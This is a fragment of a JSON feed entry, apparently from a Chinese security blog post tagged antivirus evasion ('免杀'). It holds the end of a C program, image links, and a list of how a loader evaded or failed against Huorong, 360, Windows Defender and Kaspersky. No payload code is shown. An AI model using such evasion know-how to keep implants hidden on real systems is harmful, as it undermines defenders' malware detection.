class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp2zdzbnj31bz0plt9l.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp315am2j30y60plmyf.jpg\" alt=\"\" /></p>\n<pre><code>最终效果如下：\n火绒：可持续上线不会掉\n360：可持续上线，可能长时间会掉\nwindef：可上线但执行不了命令(现在已经被标记了上不了线)\n卡巴斯基：可过静态无法上线\n</code></pre>\n<p><img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp35147bj31mf0mcwml.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp390367j31kp0koagt.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp3avk4jj30sg0qmju1.jpg\" alt=\"\" /></p>\n<p><img data-src=\"//dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnqp3dngo0j30s80lsacp.jpg\" alt=\"\" /></p>\n",
            "tags": [
                "免杀",
                "免杀"
            ]
        }
    ]
}